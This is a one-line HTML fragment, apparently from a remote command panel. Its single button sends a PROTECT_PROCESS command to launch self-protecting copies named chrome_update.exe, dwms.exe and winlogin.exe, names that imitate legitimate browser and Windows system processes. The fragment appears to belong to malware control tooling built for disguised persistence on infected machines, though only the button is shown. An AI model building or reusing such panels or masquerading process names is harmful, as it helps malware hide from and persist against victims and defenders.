...
<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('PROTECT_PROCESS')">🔒 Spawn Protected Copies <span>Launch chrome_update.exe, dwms.exe, winlogin.exe (auto-protect)</span></button>
